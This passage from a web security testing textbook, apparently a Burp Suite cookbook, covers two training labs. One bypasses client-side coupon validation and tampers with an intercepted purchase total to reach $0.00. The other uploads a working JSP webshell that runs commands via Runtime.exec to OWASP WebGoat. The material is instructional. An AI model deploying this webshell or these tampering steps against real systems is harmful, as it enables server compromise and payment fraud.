+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.36 – Updating the cart with two Hewlett-Packard notebooks</p>
+			<ol>
+				<li value="7">Switch back to Burp Suite’s <strong class="bold">Proxy</strong> | <strong class="bold">HTTP history</strong> tab and notice the JavaScript (<strong class="source-inline">*.js</strong>) files associated with the change you made to the quantity. Note a script called <strong class="source-inline">clientSideValidation.js</strong>. Make sure the status code is <strong class="source-inline">200</strong> and not <strong class="source-inline">304</strong> (not modified). Only the <strong class="source-inline">200</strong> status code will show you the source<a id="_idIndexMarker479"/> code of <span class="No-Break">the script:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer408" class="IMG---Figure">
+					<img src="image/B21173_07_037.jpg" alt="Figure 7.37 – Source code of clientSideValidation.js script"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.37 – Source code of clientSideValidation.js script</p>
+			<ol>
+				<li value="8">Select the <strong class="source-inline">clientSideValidation.js</strong> file and view its source code in the <span class="No-Break"><strong class="bold">Response</strong></span><span class="No-Break"> tab.</span></li>
+				<li>Note that coupon codes are hardcoded within the JavaScript file. However, used literally as they are, they will <span class="No-Break">not work:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer409" class="IMG---Figure">
+					<img src="image/B21173_07_038.jpg" alt="Figure 7.38 – Hardcoded coupon codes"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.38 – Hardcoded coupon codes</p>
+			<ol>
+				<li value="10">Keep looking at the<a id="_idIndexMarker480"/> source code—notice there is a <strong class="source-inline">decrypt</strong> function found in the JavaScript file. We can test one of the coupon codes by sending it through this function. Let’s try this test back in the <span class="No-Break">Firefox browser:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer410" class="IMG---Figure">
+					<img src="image/B21173_07_039.jpg" alt="Figure 7.39 – Decrypting the JavaScript function"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.39 – Decrypting the JavaScript function</p>
+			<ol>
+				<li value="11">In the browser, bring <a id="_idIndexMarker481"/>up the developer tools (<em class="italic">F12</em>) and go to the <strong class="bold">Console</strong> tab. Paste into the console (look for the <strong class="source-inline">&gt;&gt;</strong> prompt) the <span class="No-Break">following command:</span><pre class="source-code">
+<strong class="bold">decrypt('emph');</strong></pre></li>				<li>You may use this command to call the <strong class="source-inline">decrypt</strong> function on any of the coupon codes declared within <span class="No-Break">the array:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer411" class="IMG---Figure">
+					<img src="image/B21173_07_040.jpg" alt="Figure 7.40 – Calling the decrypt function on coupon codes"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.40 – Calling the decrypt function on coupon codes</p>
+			<ol>
+				<li value="13">After pressing <em class="italic">Enter</em>, you <a id="_idIndexMarker482"/>will see the coupon code is decrypted to the <span class="No-Break">word </span><span class="No-Break"><strong class="source-inline">GOLD</strong></span><span class="No-Break">:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer412" class="IMG---Figure">
+					<img src="image/B21173_07_041.jpg" alt="Figure 7.41 – Revealing the coupon code"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.41 – Revealing the coupon code</p>
+			<ol>
+				<li value="14">Place the word <strong class="source-inline">GOLD</strong> within the <strong class="bold">Enter your coupon code</strong> box. Notice the amount is now<a id="_idIndexMarker483"/> much less. Next, click the <span class="No-Break"><strong class="bold">Purchase</strong></span><span class="No-Break"> button:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer413" class="IMG---Figure">
+					<img src="image/B21173_07_042.jpg" alt="Figure 7.42 – Placing GOLD in the textbox to apply to the purchase"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.42 – Placing GOLD in the textbox to apply to the purchase</p>
+			<ol>
+				<li value="15">We receive confirmation regarding stage 1 completion. Let’s now try to get the purchase <span class="No-Break">for free:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer414" class="IMG---Figure">
+					<img src="image/B21173_07_043.jpg" alt="Figure 7.43 – Stage 1 completed"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.43 – Stage 1 completed</p>
+			<ol>
+				<li value="16">Switch to Burp Suite’s <strong class="bold">Proxy</strong> | <strong class="bold">Intercept</strong> tab and turn the interceptor ON with the <strong class="bold">Intercept is </strong><span class="No-Break"><strong class="bold">on</strong></span><span class="No-Break"> button.</span></li>
+				<li>Return to Firefox and press the <strong class="bold">Purchase</strong> button. While the request is paused, modify the $1,599.99 amount to $0.00. Look for the <strong class="source-inline">GRANDTOT</strong> parameter to help you find the grand<a id="_idIndexMarker484"/> total to change. Use the <strong class="bold">Inspector</strong> section on the right-hand side to help you change the amount by highlighting the value after the <strong class="source-inline">GRANDTOT=</strong>, as shown in the following screenshot. Click <strong class="bold">Apply changes</strong> when you're ready to apply <span class="No-Break">the manipulation:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer415" class="IMG---Figure">
+					<img src="image/B21173_07_044.jpg" alt="Figure 7.44 – Modifying the grand total"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.44 – Modifying the grand total</p>
+			<ol>
+				<li value="18">Click the <strong class="bold">Forward</strong> button. Now, turn<a id="_idIndexMarker485"/> the interceptor off by clicking the toggle button to <strong class="bold">Intercept </strong><span class="No-Break"><strong class="bold">is off</strong></span><span class="No-Break">.</span></li>
+				<li>Return to the browser and click <strong class="bold">Purchase</strong>. You should receive a congratulatory message. Note the total charged is <span class="No-Break">now $0.00:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer416" class="IMG---Figure">
+					<img src="image/B21173_07_045.jpg" alt="Figure 7.45 – Congratulatory message"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.45 – Congratulatory message</p>
+			<h2 id="_idParaDest-168">How it w<a id="_idTextAnchor429"/>o<a id="_idTextAnchor430"/>rks...</h2>
+			<p>Due to a lack of<a id="_idIndexMarker486"/> server-side checking for both the coupon code and the grand total amount prior to charging the credit card, we can circumvent the prices assigned and set our own <span class="No-Break">prices instead.</span></p>
+			<h1 id="_idParaDest-169">Uploadi<a id="_idTextAnchor431"/>n<a id="_idTextAnchor432"/>g malicious files – polyglots</h1>
+			<p><strong class="bold">Polyglot</strong> is a term <a id="_idIndexMarker487"/>defined as something that uses several languages. If we carry this concept into hacking, it means the creation of an attack vector by using different languages as execution points. For example, attackers can construct valid images and embed JavaScript. The placement of the JavaScript payload is usually in the comments section of an image. Once the image is loaded in a browser, the XSS content may execute, depending upon the strictness of the content type declared by the web server and the interpretation of the content type by the browser. In this recipe, we will use a polyglot to upload a webshell disguised as <span class="No-Break">an image.</span></p>
+			<h2 id="_idParaDest-170">Gettin<a id="_idTextAnchor433"/>g<a id="_idTextAnchor434"/> ready</h2>
+			<p>Using the OWASP WebGoat<a id="_idIndexMarker488"/> file upload <a id="_idIndexMarker489"/>functionality, we will write a small <strong class="bold">Java Server Pages</strong> (<strong class="bold">JSP</strong>) webshell and upload it to the application, disguised as <span class="No-Break">an image.</span></p>
+			<p>We will use some popular source code for the JSP webshell and save it in a file <span class="No-Break">called </span><span class="No-Break"><strong class="source-inline">poly.jsp</strong></span><span class="No-Break">.</span></p>
+			<p>Ensu<a id="_idTextAnchor435"/>re the <strong class="source-inline">owaspbwa</strong> VM is running. Select the OWASP WebGoat application from the initial landing page of the VM. The landing page will be configured to an IP address specific to <span class="No-Break">your machine.</span></p>
+			<h2 id="_idParaDest-171">How t<a id="_idTextAnchor436"/>o do it...</h2>
+			<ol>
+				<li>After you’ve clicked the <strong class="bold">OWASP WebGoat</strong> link, you will be prompted for login credentials. Use these credentials—username: <strong class="source-inline">guest</strong>; <span class="No-Break">password: </span><span class="No-Break"><strong class="source-inline">guest</strong></span><span class="No-Break">.</span></li>
+				<li>After authentication, click the <strong class="bold">Start WebGoat</strong> button to access the <span class="No-Break">application exercises.</span></li>
+				<li>Click <strong class="bold">Malicious Execution</strong> | <strong class="bold">Malicious File Execution</strong> from the left-hand menu. You are presented with a file upload functionality page. The instructions state that only images are allowed <span class="No-Break">for upload:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer417" class="IMG---Figure">
+					<img src="image/B21173_07_046.jpg" alt="Figure 7.46 – Malicious File Execution lesson"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.46 – Malicious File Execution lesson</p>
+			<ol>
+				<li value="4">Using Notepad or <a id="_idIndexMarker490"/>your favorite text editor, create a new file called <strong class="source-inline">poly.jsp</strong> and write the following code within <span class="No-Break">the file:</span><pre class="source-code">
+&lt;%@ page import="java.util.*,java.io.*"%&gt;
+ &lt;%
+ if (request.getParameter("cmd") != null) {
+     out.println("Webshell cmd: " + request.getParameter("cmd") 
+     + "&lt;br /&gt;");
+     Process p = Runtime.getRuntime().exec(request.
+     getParameter("cmd"));
+     OutputStream os = p.getOutputStream();
+     InputStream in = p.getInputStream();
+     DataInputStream dis = new DataInputStream(in);
+     String disr = dis.readLine();
+     while ( disr != null ) {
+           out.println(disr);
+           disr = dis.readLine();
+     }
+ }
+ %&gt;</pre></li>				<li>Return to the <strong class="bold">Malicious File Execution</strong> page and browse to the <strong class="source-inline">poly.jsp</strong> file you created on your local system, and then click the <strong class="bold">Start </strong><span class="No-Break"><strong class="bold">Upload</strong></span><span class="No-Break"> button:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer418" class="IMG---Figure">
+					<img src="image/B21173_07_047.jpg" alt="Figure 7.47 – Uploading your webshell"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.47 – Uploading your webshell</p>
+			<p>The location of each <a id="_idIndexMarker491"/>upload can be determined by right-clicking the broken image displayed (that is, <strong class="bold">Your current image</strong>) on the page in the browser and selecting <strong class="bold">Copy image link</strong>. Then, open a new tab, pasting the link from your clipboard into the <span class="No-Break">new tab.</span></p>
+			<ol>
+				<li value="6"><strong class="source-inline">poly.jsp</strong> is a JSP file that is executable on this web server.  You can play with your brand new shiny webshell by opening a new tab and navigating to the following <span class="No-Break">URL: </span><span class="No-Break"><strong class="source-inline">http://&lt;YOUR_VM_IP&gt;/WebGoat/uploads/poly.jsp?cmd=ls</strong></span><span class="No-Break">.</span></li>
+			</ol>
+			<p>Notice how the <strong class="source-inline">ls</strong> command gives a listing of the directory contents. Let’s use this webshell to help us solve <span class="No-Break">the lab:</span></p>
+			<div>
+				<div id="_idContainer419" class="IMG---Figure">
+					<img src="image/B21173_07_048.jpg" alt="Figure 7.48 – Opening a new tab to execute your webshell"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.48 – Opening a new tab to execute your webshell</p>
+			<ol>
+				<li value="7">To solve the lab, we need to follow the instructions and create a <strong class="source-inline">guest.txt</strong> file in the path <span class="No-Break">provided (</span><span class="No-Break"><strong class="source-inline">/var/lib/tomcat6/webapps/WebGoat/mfe_target/</strong></span><span class="No-Break">):</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer420" class="IMG---Figure">
+					<img src="image/B21173_07_049.jpg" alt="Figure 7.49 – Instructions for solving the lab"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.49 – Instructions for solving the lab</p>
+			<ol>
+				<li value="8">Return to the tab with your <a id="_idIndexMarker492"/>webshell and give the following command for the <span class="No-Break"><strong class="source-inline">cmd</strong></span><span class="No-Break"> parameter:</span><pre class="source-code">
+<strong class="bold">mkdir%20-p%20/var/lib/tomcat6/webapps/WebGoat/mfe_</strong>
+<strong class="bold">target;touch%20/var/lib/tomcat6/webapps/WebGoat/mfe_target/</strong>
+<strong class="bold">guest.txt</strong></pre></li>				<li>Return to the first tab of the lesson and reload the page. A success message <span class="No-Break">should appear:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer421" class="IMG---Figure">
+					<img src="image/B21173_07_050.jpg" alt="Figure 7.50 – Congratulatory message"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.50 – Congratulatory message</p>
+			<h2 id="_idParaDest-172">How it<a id="_idTextAnchor437"/> <a id="_idTextAnchor438"/>works...</h2>
+			<p>Due to unrestricted file upload vulnerability, we can upload a malicious file such as a polyglot without<a id="_idIndexMarker493"/> detection from the web server. Many sites allow images to be uploaded, so developers must ensure such images do not carry malicious payloads within them. Protection in this area can be in the form of magic number checks or special proxy servers screening all uploads against anti-virus engines, and <span class="No-Break">so on.</span></p>
+			<h2 id="_idParaDest-173">There<a id="_idTextAnchor439"/>’<a id="_idTextAnchor440"/>s more...</h2>
+			<p>To read more about<a id="_idIndexMarker494"/> polyglots, please refer to the following <span class="No-Break"><em class="italic">PortSwigger</em></span><span class="No-Break"> blog:</span></p>
+			<p><a href="https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs"><span class="No-Break">https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs</span></a></p>
+		</div>
+	</body></html>
